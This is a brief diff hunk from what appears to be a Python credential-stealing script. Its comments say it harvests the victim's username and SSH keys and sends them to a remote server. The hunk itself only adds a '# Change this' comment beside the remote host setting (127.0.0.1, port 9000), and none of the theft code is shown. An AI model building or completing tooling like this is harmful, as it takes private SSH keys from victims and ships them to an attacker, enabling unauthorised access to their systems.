@@ -7,7 +7,7 @@ import time
 # This script will harvest the victim's username and ssh keys
 # and deliver them to a remote server
 
-RHOST = "127.0.0.1"
+RHOST = "127.0.0.1" # Change this
 RPORT = 9000
 
 # Get the username
